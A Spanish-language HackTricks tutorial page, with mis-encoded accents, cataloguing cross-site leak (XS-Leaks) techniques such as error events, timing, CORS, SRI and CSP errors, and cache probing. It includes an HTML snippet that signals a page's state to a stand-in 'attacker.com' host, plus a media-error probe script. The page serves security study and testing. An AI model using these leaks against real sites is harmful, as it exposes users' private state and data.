# XS-Search/XS-Leaks

<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Utiliza [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) para construir y **automatizar flujos de trabajo** f√°cilmente con las herramientas comunitarias m√°s avanzadas del mundo.\
Accede hoy mismo:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

<details>

<summary><strong>Aprende hacking en AWS desde cero hasta experto con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Otras formas de apoyar a HackTricks:

* Si deseas ver tu **empresa anunciada en HackTricks** o **descargar HackTricks en PDF** ¬°Consulta los [**PLANES DE SUSCRIPCI√ìN**](https://github.com/sponsors/carlospolop)!
* Obt√©n [**productos oficiales de PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colecci√≥n exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **√önete al** üí¨ [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **s√≠guenos** en **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Comparte tus trucos de hacking enviando PRs a los repositorios de** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

## Informaci√≥n B√°sica

XS-Search es un m√©todo utilizado para **extraer informaci√≥n de origen cruzado** aprovechando **vulnerabilidades de canal lateral**.

Los componentes clave involucrados en este ataque incluyen:

* **Web Vulnerable**: El sitio web objetivo del cual se pretende extraer informaci√≥n.
* **Web del Atacante**: El sitio web malicioso creado por el atacante, que la v√≠ctima visita, alojando el exploit.
* **M√©todo de Inclusi√≥n**: La t√©cnica empleada para incorporar la Web Vulnerable en la Web del Atacante (por ejemplo, window.open, iframe, fetch, etiqueta HTML con href, etc.).
* **T√©cnica de Fuga**: T√©cnicas utilizadas para discernir diferencias en el estado de la Web Vulnerable basadas en la informaci√≥n recopilada a trav√©s del m√©todo de inclusi√≥n.
* **Estados**: Las dos condiciones potenciales de la Web Vulnerable, que el atacante busca distinguir.
* **Diferencias Detectables**: Variaciones observables en las que el atacante se basa para inferir el estado de la Web Vulnerable.

### Diferencias Detectables

Varios aspectos pueden analizarse para diferenciar los estados de la Web Vulnerable:

* **C√≥digo de Estado**: Distinguir entre **varios c√≥digos de estado de respuesta HTTP** de origen cruzado, como errores de servidor, errores de cliente o errores de autenticaci√≥n.
* **Uso de API**: Identificar **el uso de APIs web** en las p√°ginas, revelando si una p√°gina de origen cruzado emplea una API web espec√≠fica de JavaScript.
* **Redirecciones**: Detectar navegaciones a diferentes p√°ginas, no solo redirecciones HTTP, sino tambi√©n aquellas desencadenadas por JavaScript o HTML.
* **Contenido de la P√°gina**: Observar **variaciones en el cuerpo de la respuesta HTTP** o en los subrecursos de la p√°gina, como el **n√∫mero de marcos incrustados** o disparidades de tama√±o en im√°genes.
* **Encabezado HTTP**: Notar la presencia o posiblemente el valor de un **encabezado de respuesta HTTP espec√≠fico**, incluidos encabezados como X-Frame-Options, Content-Disposition y Cross-Origin-Resource-Policy.
* **Temporizaci√≥n**: Observar disparidades de tiempo consistentes entre los dos estados.

### M√©todos de Inclusi√≥n

* **Elementos HTML**: HTML ofrece varios elementos para **inclusi√≥n de recursos de origen cruzado**, como hojas de estilo, im√°genes o scripts, obligando al navegador a solicitar un recurso no HTML. Una recopilaci√≥n de posibles elementos HTML para este prop√≥sito se puede encontrar en [https://github.com/cure53/HTTPLeaks](https://github.com/cure53/HTTPLeaks).
* **Marcos**: Elementos como **iframe**, **object** y **embed** pueden incrustar recursos HTML directamente en la p√°gina del atacante. Si la p√°gina **carece de protecci√≥n de enmarcado**, JavaScript puede acceder al objeto window del recurso enmarcado a trav√©s de la propiedad contentWindow.
* **Pop-ups**: El m√©todo **`window.open`** abre un recurso en una nueva pesta√±a o ventana, proporcionando un **identificador de ventana** para que JavaScript interact√∫e con m√©todos y propiedades siguiendo la SOP. Los pop-ups, a menudo utilizados en inicio de sesi√≥n √∫nico, evitan las restricciones de enmarcado y cookies de un recurso objetivo. Sin embargo, los navegadores modernos restringen la creaci√≥n de pop-ups a ciertas acciones del usuario.
* **Solicitudes JavaScript**: JavaScript permite solicitudes directas a recursos objetivo utilizando **XMLHttpRequests** o la **Fetch API**. Estos m√©todos ofrecen un control preciso sobre la solicitud, como optar por seguir redirecciones HTTP.

### T√©cnicas de Fuga

* **Manejador de Eventos**: Una t√©cnica de fuga cl√°sica en XS-Leaks, donde los manejadores de eventos como **onload** y **onerror** proporcionan informaci√≥n sobre el √©xito o fracaso de la carga de recursos.
* **Mensajes de Error**: Las excepciones de JavaScript o p√°ginas de error especiales pueden proporcionar informaci√≥n de fuga directamente desde el mensaje de error o diferenciando entre su presencia y ausencia.
* **L√≠mites Globales**: Las limitaciones f√≠sicas de un navegador, como la capacidad de memoria u otros l√≠mites impuestos por el navegador, pueden indicar cu√°ndo se alcanza un umbral, sirviendo como t√©cnica de fuga.
* **Estado Global**: Las interacciones detectables con los **estados globales de los navegadores** (por ejemplo, la interfaz History) pueden ser explotadas. Por ejemplo, el **n√∫mero de entradas** en el historial de un navegador puede ofrecer pistas sobre las p√°ginas de origen cruzado.
* **API de Rendimiento**: Esta API proporciona **detalles de rendimiento de la p√°gina actual**, incluidos los tiempos de red para el documento y los recursos cargados, permitiendo inferencias sobre los recursos solicitados.
* **Atributos Legibles**: Algunos atributos HTML son **legibles de origen cruzado** y pueden utilizarse como t√©cnica de fuga. Por ejemplo, la propiedad `window.frame.length` permite a JavaScript contar los marcos incluidos en una p√°gina web de origen cruzado.

## Herramienta XSinator y Documento

XSinator es una herramienta autom√°tica para **verificar navegadores contra varios XS-Leaks conocidos** explicados en su documento: **[https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf)**

Puedes **acceder a la herramienta en [https://xsinator.com/](https://xsinator.com/)**

{% hint style="warning" %}
**XS-Leaks Excluidos**: Tuvimos que excluir XS-Leaks que dependen de **service workers** ya que interferir√≠an con otras fugas en XSinator. Adem√°s, elegimos **excluir XS-Leaks que dependen de configuraciones incorrectas y errores en una aplicaci√≥n web espec√≠fica**. Por ejemplo, configuraciones incorrectas de Compartir Recursos de Origen (CORS), filtraciones de postMessage o Cross-Site Scripting. Adem√°s, excluimos XS-Leaks basados en tiempo ya que a menudo sufren de ser lentos, ruidosos e inexactos.
{% endhint %}

<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
Utiliza [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) para construir y **automatizar flujos de trabajo** f√°cilmente con las herramientas comunitarias m√°s avanzadas del mundo.\
Accede hoy mismo:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## **T√©cnicas Basadas en Tiempo**

Algunas de las siguientes t√©cnicas van a utilizar el tiempo como parte del proceso para detectar diferencias en los posibles estados de las p√°ginas web. Hay diferentes formas de medir el tiempo en un navegador web.

**Relojes**: La API [performance.now()](https://developer.mozilla.org/en-US/docs/Web/API/Performance/now) permite a los desarrolladores obtener medidas de tiempo de alta resoluci√≥n.\
Hay una cantidad considerable de APIs que los atacantes pueden abusar para crear relojes impl√≠citos: [Broadcast Channel API](https://developer.mozilla.org/en-US/docs/Web/API/Broadcast\_Channel\_API), [Message Channel API](https://developer.mozilla.org/en-US/docs/Web/API/MessageChannel), [requestAnimationFrame](https://developer.mozilla.org/en-US/docs/Web/API/window/requestAnimationFrame), [setTimeout](https://developer.mozilla.org/en-US/docs/Web/API/WindowOrWorkerGlobalScope/setTimeout), animaciones CSS y otros.\
Para m√°s informaci√≥n: [https://xsleaks.dev/docs/attacks/timing-attacks/clocks](https://xsleaks.dev/docs/attacks/timing-attacks/clocks/).

## T√©cnicas de Manejador de Eventos

### Onload/Onerror

* **M√©todos de Inclusi√≥n**: Marcos, Elementos HTML
* **Diferencia Detectable**: C√≥digo de Estado
* **M√°s informaci√≥n**: [https://www.usenix.org/conference/usenixsecurity19/presentation/staicu](https://www.usenix.org/conference/usenixsecurity19/presentation/staicu), [https://xsleaks.dev/docs/attacks/error-events/](https://xsleaks.dev/docs/attacks/error-events/)
* **Resumen**: si se intenta cargar un recurso, los eventos onerror/onload se activan cuando el recurso se carga con √©xito/no con √©xito, es posible averiguar el c√≥digo de estado.
* **Ejemplo de c√≥digo**: [https://xsinator.com/testing.html#Event%20Handler%20Leak%20(Script)](https://xsinator.com/testing.html#Event%20Handler%20Leak%20\(Script\))

{% content-ref url="xs-search/cookie-bomb-+-onerror-xs-leak.md" %}
[cookie-bomb-+-onerror-xs-leak.md](xs-search/cookie-bomb-+-onerror-xs-leak.md)
{% endcontent-ref %}

El ejemplo de c√≥digo intenta **cargar objetos de scripts desde JS**, pero **otros tags** como objetos, hojas de estilo, im√°genes, audios tambi√©n podr√≠an ser utilizados. Adem√°s, tambi√©n es posible inyectar directamente la **etiqueta** y declarar los eventos `onload` y `onerror` dentro de la etiqueta (en lugar de inyectarla desde JS).

Tambi√©n existe una versi√≥n sin script de este ataque:
```html
<object data="//example.com/404">
<object data="//attacker.com/?error"></object>
</object>
```
En este caso, si `example.com/404` no se encuentra, se cargar√° `attacker.com/?error`.

### Tiempo de carga

* **M√©todos de inclusi√≥n**: Elementos HTML
* **Diferencia detectable**: Tiempo (generalmente debido al contenido de la p√°gina, c√≥digo de estado)
* **M√°s informaci√≥n**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#onload-events](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#onload-events)
* **Resumen:** La [**API performance.now()**](https://xsleaks.dev/docs/attacks/timing-attacks/clocks/#performancenow) se puede utilizar para medir cu√°nto tiempo se tarda en realizar una solicitud. Sin embargo, se podr√≠an utilizar otros relojes, como la [**API PerformanceLongTaskTiming**](https://developer.mozilla.org/en-US/docs/Web/API/PerformanceLongTaskTiming) que puede identificar tareas que se ejecutan durante m√°s de 50 ms.
* **Ejemplo de c√≥digo**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#onload-events](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#onload-events) otro ejemplo en:

{% content-ref url="xs-search/performance.now-example.md" %}
[performance.now-example.md](xs-search/performance.now-example.md)
{% endcontent-ref %}

#### Tiempo de carga + Tarea pesada forzada

Esta t√©cnica es similar a la anterior, pero el **atacante** tambi√©n **forzar√°** alguna acci√≥n para que tome un **tiempo relevante** cuando la **respuesta sea positiva o negativa** y medir√° ese tiempo.

{% content-ref url="xs-search/performance.now-+-force-heavy-task.md" %}
[performance.now-+-force-heavy-task.md](xs-search/performance.now-+-force-heavy-task.md)
{% endcontent-ref %}

### Tiempo de descarga/cierre

* **M√©todos de inclusi√≥n**: Marcos
* **Diferencia detectable**: Tiempo (generalmente debido al contenido de la p√°gina, c√≥digo de estado)
* **M√°s informaci√≥n**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#unload-events](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#unload-events)
* **Resumen:** El reloj [SharedArrayBuffer](https://xsleaks.dev/docs/attacks/timing-attacks/clocks/#sharedarraybuffer-and-web-workers) se puede utilizar para medir cu√°nto tiempo se tarda en realizar una solicitud. Se podr√≠an utilizar otros relojes.
* **Ejemplo de c√≥digo**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#unload-events](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#unload-events)

El tiempo necesario para recuperar un recurso se puede medir utilizando los eventos [`unload`](https://developer.mozilla.org/en-US/docs/Web/API/Window/unload_event) y [`beforeunload`](https://developer.mozilla.org/en-US/docs/Web/API/Window/beforeunload_event). El evento **`beforeunload`** se dispara cuando el navegador est√° a punto de navegar a una nueva p√°gina, mientras que el evento **`unload`** ocurre cuando la navegaci√≥n realmente est√° teniendo lugar. La diferencia de tiempo entre estos dos eventos se puede calcular para determinar la **duraci√≥n que el navegador pas√≥ recuperando el recurso**.

### Tiempo de marco con restricciones + carga

* **M√©todos de inclusi√≥n**: Marcos
* **Diferencia detectable**: Tiempo (generalmente debido al contenido de la p√°gina, c√≥digo de estado)
* **M√°s informaci√≥n**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#sandboxed-frame-timing-attacks](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#sandboxed-frame-timing-attacks)
* **Resumen:** La [API performance.now()](https://xsleaks.dev/docs/attacks/timing-attacks/clocks/#performancenow) se puede utilizar para medir cu√°nto tiempo se tarda en realizar una solicitud. Se podr√≠an utilizar otros relojes.
* **Ejemplo de c√≥digo**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#sandboxed-frame-timing-attacks](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#sandboxed-frame-timing-attacks)

Se ha observado que en ausencia de [Protecciones de Enmarcado](https://xsleaks.dev/docs/defenses/opt-in/xfo/), un atacante puede medir el tiempo requerido para que una p√°gina y sus subrecursos se carguen a trav√©s de la red. Esta medici√≥n es t√≠picamente posible porque el controlador `onload` de un iframe se activa solo despu√©s de completarse la carga de recursos y la ejecuci√≥n de JavaScript. Para evitar la variabilidad introducida por la ejecuci√≥n de scripts, un atacante podr√≠a emplear el atributo [`sandbox`](https://developer.mozilla.org/en-US/docs/Web/HTML/Element/iframe) dentro del `<iframe>`. La inclusi√≥n de este atributo restringe numerosas funcionalidades, especialmente la ejecuci√≥n de JavaScript, facilitando as√≠ una medici√≥n que est√° predominantemente influenciada por el rendimiento de la red.
```javascript
// Example of an iframe with the sandbox attribute
<iframe src="example.html" sandbox></iframe>
```
### #ID + error + onload

* **M√©todos de Inclusi√≥n**: Marcos
* **Diferencia Detectable**: Contenido de la P√°gina
* **M√°s informaci√≥n**:
* **Resumen**: Si puedes hacer que la p√°gina genere un error cuando se accede al contenido correcto y que cargue correctamente cuando se accede a cualquier contenido, entonces puedes hacer un bucle para extraer toda la informaci√≥n sin medir el tiempo.
* **Ejemplo de C√≥digo**:

Supongamos que puedes **insertar** la **p√°gina** que tiene el **contenido secreto** **dentro de un Iframe**.

Puedes hacer que la v√≠ctima busque el archivo que contiene "_**flag**_" usando un **Iframe** (explotando un CSRF, por ejemplo). Dentro del Iframe, sabes que el _**evento onload**_ se **ejecutar√° siempre al menos una vez**. Luego, puedes **cambiar** la **URL** del **iframe** pero cambiando solo el **contenido** del **hash** dentro de la URL.

Por ejemplo:

1. **URL1**: www.attacker.com/xssearch#try1
2. **URL2**: www.attacker.com/xssearch#try2

Si la primera URL se **carg√≥ correctamente**, entonces, al **cambiar** la **parte hash** de la URL, el evento **onload** **no se activar√°** nuevamente. Pero **si** la p√°gina tuvo alg√∫n tipo de **error** al **cargar**, entonces, el evento **onload** se **activar√° nuevamente**.

Entonces, puedes **distinguir entre** una p√°gina **cargada correctamente** o una p√°gina que tiene un **error** cuando se accede.

### Ejecuci√≥n de Javascript

* **M√©todos de Inclusi√≥n**: Marcos
* **Diferencia Detectable**: Contenido de la P√°gina
* **M√°s informaci√≥n**:
* **Resumen:** Si la **p√°gina** est√° **devolviendo** el **contenido sensible**, **o** un **contenido** que puede ser **controlado** por el usuario. El usuario podr√≠a establecer **c√≥digo JS v√°lido en el caso negativo**, y **cargar** cada intento dentro de las etiquetas **`<script>`**, por lo que en los casos **negativos** el c√≥digo de los atacantes **se ejecuta**, y en los casos **afirmativos** no se ejecutar√° **nada**.
* **Ejemplo de C√≥digo**:

{% content-ref url="xs-search/javascript-execution-xs-leak.md" %}
[javascript-execution-xs-leak.md](xs-search/javascript-execution-xs-leak.md)
{% endcontent-ref %}

### CORB - Onerror

* **M√©todos de Inclusi√≥n**: Elementos HTML
* **Diferencia Detectable**: C√≥digo de Estado y Encabezados
* **M√°s informaci√≥n**: [https://xsleaks.dev/docs/attacks/browser-features/corb/](https://xsleaks.dev/docs/attacks/browser-features/corb/)
* **Resumen**: **Cross-Origin Read Blocking (CORB)** es una medida de seguridad que evita que las p√°ginas web carguen ciertos recursos sensibles de origen cruzado para protegerse contra ataques como **Spectre**. Sin embargo, los atacantes pueden explotar su comportamiento protector. Cuando una respuesta sujeta a **CORB** devuelve un `Content-Type` protegido por **CORB** con `nosniff` y un c√≥digo de estado `2xx`, **CORB** elimina el cuerpo y los encabezados de la respuesta. Los atacantes que observan esto pueden inferir la combinaci√≥n del **c√≥digo de estado** (indicando √©xito o error) y el `Content-Type` (indicando si est√° protegido por **CORB**), lo que lleva a una posible fuga de informaci√≥n.
* **Ejemplo de C√≥digo**:

Consulta el enlace de m√°s informaci√≥n para obtener m√°s detalles sobre el ataque.

### onblur

* **M√©todos de Inclusi√≥n**: Marcos
* **Diferencia Detectable**: Contenido de la P√°gina
* **M√°s informaci√≥n**: [https://xsleaks.dev/docs/attacks/id-attribute/](https://xsleaks.dev/docs/attacks/id-attribute/), [https://xsleaks.dev/docs/attacks/experiments/portals/](https://xsleaks.dev/docs/attacks/experiments/portals/)
* **Resumen**: Filtrar datos sensibles del atributo id o name.
* **Ejemplo de C√≥digo**: [https://xsleaks.dev/docs/attacks/id-attribute/#code-snippet](https://xsleaks.dev/docs/attacks/id-attribute/#code-snippet)

Es posible **cargar una p√°gina** dentro de un **iframe** y usar el **`#id_value`** para hacer que la p√°gina se **enfoque en el elemento** del iframe con el id indicado, luego si se activa una se√±al **`onblur`**, el elemento ID existe.\
Puedes realizar el mismo ataque con etiquetas **`portal`**.

### Transmisiones postMessage <a href="#postmessage-broadcasts" id="postmessage-broadcasts"></a>

* **M√©todos de Inclusi√≥n**: Marcos, Pop-ups
* **Diferencia Detectable**: Uso de API
* **M√°s informaci√≥n**: [https://xsleaks.dev/docs/attacks/postmessage-broadcasts/](https://xsleaks.dev/docs/attacks/postmessage-broadcasts/)
* **Resumen**: Recopilar informaci√≥n sensible de un postMessage o utilizar la presencia de postMessages como un or√°culo para conocer el estado del usuario en la p√°gina.
* **Ejemplo de C√≥digo**: `Cualquier c√≥digo que escuche todos los postMessages.`

Las aplicaciones utilizan con frecuencia las transmisiones de [`postMessage`](https://developer.mozilla.org/en-US/docs/Web/API/Window/postMessage) para comunicarse entre diferentes or√≠genes. Sin embargo, este m√©todo puede exponer inadvertidamente **informaci√≥n sensible** si el par√°metro `targetOrigin` no est√° correctamente especificado, lo que permite que cualquier ventana reciba los mensajes. Adem√°s, el simple acto de recibir un mensaje puede actuar como un **or√°culo**; por ejemplo, ciertos mensajes solo podr√≠an enviarse a usuarios que hayan iniciado sesi√≥n. Por lo tanto, la presencia o ausencia de estos mensajes puede revelar informaci√≥n sobre el estado o la identidad del usuario, como si est√°n autenticados o no.

<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
```javascript
// Code saved here in case it dissapear from the link
// Based on MDN MediaError example: https://mdn.github.io/dom-examples/media/mediaerror/
window.addEventListener("load", startup, false);
function displayErrorMessage(msg) {
document.getElementById("log").innerHTML += msg;
}

function startup() {
let audioElement = document.getElementById("audio");
// "https://mdn.github.io/dom-examples/media/mediaerror/assets/good.mp3";
document.getElementById("startTest").addEventListener("click", function() {
audioElement.src = document.getElementById("testUrl").value;
}, false);
// Create the event handler
var errHandler = function() {
let err = this.error;
let message = err.message;
let status = "";

// Chrome error.message when the request loads successfully: "DEMUXER_ERROR_COULD_NOT_OPEN: FFmpegDemuxer: open context failed"
// Firefox error.message when the request loads successfully: "Failed to init decoder"
if((message.indexOf("DEMUXER_ERROR_COULD_NOT_OPEN") != -1) || (message.indexOf("Failed to init decoder") != -1)){
status = "Success";
}else{
status = "Error";
}
displayErrorMessage("<strong>Status: " + status + "</strong> (Error code:" + err.code + " / Error Message: " + err.message + ")<br>");
};
audioElement.onerror = errHandler;
}
```
### Error de CORS

* **M√©todos de Inclusi√≥n**: Fetch API
* **Diferencia Detectable**: Encabezado
* **M√°s informaci√≥n**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.3)
* **Resumen:** En las Afirmaciones de Seguridad (SA), los mensajes de error de CORS exponen inadvertidamente la URL completa de las solicitudes redirigidas.
* **Ejemplo de C√≥digo**: [https://xsinator.com/testing.html#CORS%20Error%20Leak](https://xsinator.com/testing.html#CORS%20Error%20Leak)

Esta t√©cnica permite a un atacante **extraer el destino de la redirecci√≥n de un sitio de origen cruzado** explotando c√≥mo los navegadores basados en Webkit manejan las solicitudes CORS. Espec√≠ficamente, cuando se env√≠a una solicitud **habilitada para CORS** a un sitio objetivo que emite una redirecci√≥n basada en el estado del usuario y el navegador posteriormente niega la solicitud, la **URL completa del destino de la redirecci√≥n** se revela dentro del mensaje de error. Esta vulnerabilidad no solo revela el hecho de la redirecci√≥n, sino que tambi√©n expone el punto final de la redirecci√≥n y cualquier **par√°metro de consulta sensible** que pueda contener.

### Error de SRI

* **M√©todos de Inclusi√≥n**: Fetch API
* **Diferencia Detectable**: Encabezado
* **M√°s informaci√≥n**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.3)
* **Resumen:** En las Afirmaciones de Seguridad (SA), los mensajes de error de CORS exponen inadvertidamente la URL completa de las solicitudes redirigidas.
* **Ejemplo de C√≥digo**: [https://xsinator.com/testing.html#SRI%20Error%20Leak](https://xsinator.com/testing.html#SRI%20Error%20Leak)

Un atacante puede explotar **mensajes de error detallados** para deducir el tama√±o de las respuestas de origen cruzado. Esto es posible debido al mecanismo de Integridad de Subrecursos (SRI), que utiliza el atributo de integridad para validar que los recursos recuperados, a menudo de CDNs, no hayan sido manipulados. Para que SRI funcione en recursos de origen cruzado, estos deben estar **habilitados para CORS**; de lo contrario, no est√°n sujetos a comprobaciones de integridad. En las Afirmaciones de Seguridad (SA), al igual que el error de CORS XS-Leak, un mensaje de error puede ser capturado despu√©s de que falle una solicitud de recuperaci√≥n con un atributo de integridad. Los atacantes pueden **provocar deliberadamente este error** asignando un **valor de hash falso** al atributo de integridad de cualquier solicitud. En SA, el mensaje de error resultante revela inadvertidamente la longitud del contenido del recurso solicitado. Esta fuga de informaci√≥n permite a un atacante discernir variaciones en el tama√±o de la respuesta, allanando el camino para ataques sofisticados de XS-Leak.

### Violaci√≥n/Detecci√≥n de CSP

* **M√©todos de Inclusi√≥n**: Pop-ups
* **Diferencia Detectable**: C√≥digo de Estado
* **M√°s informaci√≥n**: [https://bugs.chromium.org/p/chromium/issues/detail?id=313737](https://bugs.chromium.org/p/chromium/issues/detail?id=313737), [https://lists.w3.org/Archives/Public/public-webappsec/2013May/0022.html](https://lists.w3.org/Archives/Public/public-webappsec/2013May/0022.html), [https://xsleaks.dev/docs/attacks/navigations/#cross-origin-redirects](https://xsleaks.dev/docs/attacks/navigations/#cross-origin-redirects)
* **Resumen:** Al permitir solo el sitio de la v√≠ctima en la CSP, si intentamos acceder y se redirige a un dominio diferente, la CSP generar√° un error detectable.
* **Ejemplo de C√≥digo**: [https://xsinator.com/testing.html#CSP%20Violation%20Leak](https://xsinator.com/testing.html#CSP%20Violation%20Leak), [https://ctf.zeyu2001.com/2023/hacktm-ctf-qualifiers/secrets#intended-solution-csp-violation](https://ctf.zeyu2001.com/2023/hacktm-ctf-qualifiers/secrets#intended-solution-csp-violation)

Un XS-Leak puede utilizar la CSP para detectar si un sitio de origen cruzado fue redirigido a un origen diferente. Esta fuga puede detectar la redirecci√≥n, pero adem√°s, se filtra el dominio del destino de la redirecci√≥n. La idea b√°sica de este ataque es **permitir el dominio objetivo en el sitio del atacante**. Una vez que se emite una solicitud al dominio objetivo, este se **redirige** a un dominio de origen cruzado. La CSP **bloquea** el acceso a √©l y crea un **informe de violaci√≥n utilizado como t√©cnica de fuga**. Dependiendo del navegador, **este informe puede filtrar la ubicaci√≥n objetivo de la redirecci√≥n**.\
Los navegadores modernos no indicar√°n la URL a la que se redirigi√≥, pero a√∫n se puede detectar que se activ√≥ una redirecci√≥n de origen cruzado.

### Cach√©

* **M√©todos de Inclusi√≥n**: Marcos, Pop-ups
* **Diferencia Detectable**: Contenido de la P√°gina
* **M√°s informaci√≥n**: [https://xsleaks.dev/docs/attacks/cache-probing/#cache-probing-with-error-events](https://xsleaks.dev/docs/attacks/cache-probing/#cache-probing-with-error-events), [https://sirdarckcat.blogspot.com/2019/03/http-cache-cross-site-leaks.html](https://sirdarckcat.blogspot.com/2019/03/http-cache-cross-site-leaks.html)
* **Resumen:** Borra el archivo de la cach√©. Abre la p√°gina de destino y verifica si el archivo est√° presente en la cach√©.
* **Ejemplo de C√≥digo:**

Los navegadores pueden usar una cach√© compartida para todos los sitios web, independientemente de su origen, es posible deducir si una p√°gina de destino ha **solicitado un archivo espec√≠fico**.

Si una p√°gina carga una imagen solo si el usuario ha iniciado sesi√≥n, puedes **invalidar** el **recurso** (para que ya no est√© en cach√© si lo estaba, ver m√°s informaci√≥n en los enlaces), **realizar una solicitud** que podr√≠a cargar ese recurso e intentar cargar el recurso **con una solicitud incorrecta** (por ejemplo, usando un encabezado de referente demasiado largo). Si la carga del recurso **no desencadena ning√∫n error**, es porque estaba **en cach√©**.

### Directiva CSP

* **M√©todos de Inclusi√≥n**: Marcos
* **Diferencia Detectable**: Encabezado
* **M√°s informaci√≥n**: [https://bugs.chromium.org/p/chromium/issues/detail?id=1105875](https://bugs.chromium.org/p/chromium/issues/detail?id=1105875)
* **Resumen:** Las directivas de encabezado CSP pueden ser sondeadas utilizando el atributo de iframe CSP, revelando detalles de la pol√≠tica.
* **Ejemplo de C√≥digo**: [https://xsinator.com/testing.html#CSP%20Directive%20Leak](https://xsinator.com/testing.html#CSP%20Directive%20Leak)

Una caracter√≠stica novedosa en Google Chrome (GC) permite a las p√°ginas web **proponer una Pol√≠tica de Seguridad de Contenido (CSP)** configurando un atributo en un elemento iframe, con directivas de pol√≠tica transmitidas junto con la solicitud HTTP. Normalmente, el contenido incrustado debe **autorizar esto a trav√©s de un encabezado HTTP**, o se muestra una **p√°gina de error**. Sin embargo, si el iframe ya est√° gobernado por una CSP y la pol√≠tica reci√©n propuesta no es m√°s restrictiva, la p√°gina se cargar√° normalmente. Este mecanismo abre un camino para que un atacante **detecte directivas CSP espec√≠ficas** de una p√°gina de origen cruzado identificando la p√°gina de error. Aunque esta vulnerabilidad se marc√≥ como solucionada, nuestros hallazgos revelan una **nueva t√©cnica de fuga** capaz de detectar la p√°gina de error, lo que sugiere que el problema subyacente nunca se abord√≥ completamente.

### **CORP**

* **M√©todos de Inclusi√≥n**: Fetch API
* **Diferencia Detectable**: Encabezado
* **M√°s informaci√≥n**: [**https://xsleaks.dev/docs/attacks/browser-features/corp/**](https://xsleaks.dev/docs/attacks/browser-features/corp/)
* **Resumen:** Los recursos asegurados con la Pol√≠tica de Recursos de Origen Cruzado (CORP) generar√°n un error al ser recuperados desde un origen no permitido.
* **Ejemplo de C√≥digo**: [https://xsinator.com/testing.html#CORP%20Leak](https://xsinator.com/testing.html#CORP%20Leak)

El encabezado CORP es una caracter√≠stica de seguridad de plataforma web relativamente nueva que cuando se establece **bloquea las solicitudes de origen cruzado no-cors al recurso dado**. La presencia del encabezado puede ser detectada, porque un recurso protegido con CORP **generar√° un error al ser recuperado**.

### CORB

* **M√©todos de Inclusi√≥n**: Elementos HTML
* **Diferencia Detectable**: Encabezados
* **M√°s informaci√≥n**: [https://xsleaks.dev/docs/attacks/browser-features/corb/#detecting-the-nosniff-header](https://xsleaks.dev/docs/attacks/browser-features/corb/#detecting-the-nosniff-header)
* **Resumen**: CORB puede permitir a los atacantes detectar cu√°ndo est√° presente el encabezado **`nosniff`** en la solicitud.
* **Ejemplo de C√≥digo**: [https://xsinator.com/testing.html#CORB%20Leak](https://xsinator.com/testing.html#CORB%20Leak)

Consulta el enlace para obtener m√°s informaci√≥n sobre el ataque.

### Error de CORS en la mala configuraci√≥n de Reflexi√≥n de Origen <a href="#cors-error-on-origin-reflection-misconfiguration" id="cors-error-on-origin-reflection-misconfiguration"></a>

* **M√©todos de Inclusi√≥n**: Fetch API
* **Diferencia Detectable**: Encabezados
* **M√°s informaci√≥n**: [https://xsleaks.dev/docs/attacks/cache-probing/#cors-error-on-origin-reflection-misconfiguration](https://xsleaks.dev/docs/attacks/cache-probing/#cors-error-on-origin-reflection-misconfiguration)
* **Resumen**: Si el encabezado de Origen se refleja en el encabezado `Access-Control-Allow-Origin`, es posible verificar si un recurso ya est√° en la cach√©.
* **Ejemplo de C√≥digo**: [https://xsleaks.dev/docs/attacks/cache-probing/#cors-error-on-origin-reflection-misconfiguration](https://xsleaks.dev/docs/attacks/cache-probing/#cors-error-on-origin-reflection-misconfiguration)

En caso de que el **encabezado de Origen** se est√© **reflejando** en el encabezado `Access-Control-Allow-Origin`, un atacante puede abusar de este comportamiento para intentar **recuperar** el **recurso** en modo **CORS**. Si no se **desencadena un error**, significa que se **recuper√≥ correctamente del sitio web**, si se **desencadena un error**, es porque se **accedi√≥ desde la cach√©** (el error aparece porque la cach√© guarda una respuesta con un encabezado CORS que permite el dominio original y no el dominio del atacante)**.**\
Ten en cuenta que si el origen no se refleja pero se utiliza un comod√≠n (`Access-Control-Allow-Origin: *`), esto no funcionar√°.

## T√©cnica de Atributos Legibles

### Redirecci√≥n de Fetch

* **M√©todos de Inclusi√≥n**: Fetch API
* **Diferencia Detectable**: C√≥digo de Estado
